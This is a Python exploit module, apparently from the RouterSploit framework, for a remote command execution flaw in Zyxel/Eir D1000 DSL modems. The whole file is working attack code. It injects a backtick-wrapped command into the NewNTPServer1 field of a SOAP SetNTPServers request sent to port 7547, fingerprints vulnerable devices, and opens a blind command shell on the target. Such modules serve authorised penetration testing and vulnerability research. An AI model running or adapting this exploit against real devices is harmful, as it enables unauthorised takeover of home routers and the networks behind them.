from routersploit import (
    exploits,
    print_error,
    print_status,
    print_success,
    http_request,
    mute,
    validators,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Zyxel/Eir D1000 Remote Command Execution vulnerability.
    If the target is vulnerable it allows to execute commands on operating system level.
    """
    __info__ = {
        'name': 'Zyxel Eir D1000 RCE',
        'description': 'Module exploits Remote Command Execution vulnerability in Zyxel/Eir D1000 devices.'
                       'If the target is vulnerable it allows to execute commands on operating system level.',
        'authors': [
            'kenzo',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/',
            'https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759',
            'https://broadband-forum.org/technical/download/TR-064.pdf',
        ],
        'devices': [
            'Zyxel EIR D1000',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(7547, 'Target port')  # default port

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection - response is not available")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target seems to be not vulnerable")

    def execute(self, cmd):
        url = "{}:{}/UD/act?1".format(self.target, self.port)
        headers = {"Content-Type": "text/xml",
                   "SOAPAction": "urn:dslforum-org:service:Time:1#SetNTPServers"}

        data = ("<?xml version=\"1.0\"?>"
                "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                " <SOAP-ENV:Body>"
                "  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">"
                "   <NewNTPServer1>`{}`</NewNTPServer1>"  # injection
                "   <NewNTPServer2></NewNTPServer2>"
                "   <NewNTPServer3></NewNTPServer3>"
                "   <NewNTPServer4></NewNTPServer4>"
                "   <NewNTPServer5></NewNTPServer5>"
                "  </u:SetNTPServers>"
                " </SOAP-ENV:Body>"
                "</SOAP-ENV:Envelope>").format(cmd)

        http_request(method="POST", url=url, headers=headers, data=data)
        return ""

    @mute
    def check(self):  # todo: requires improvement
        url = "{}:{}/globe".format(self.target, self.port)
        response = http_request(method="GET", url=url)

        if response is not None:
            if response.status_code == 404 and "home_wan.htm" in response.text:
                return True  # target is vulnerable

        return False  # target is not vulnerable
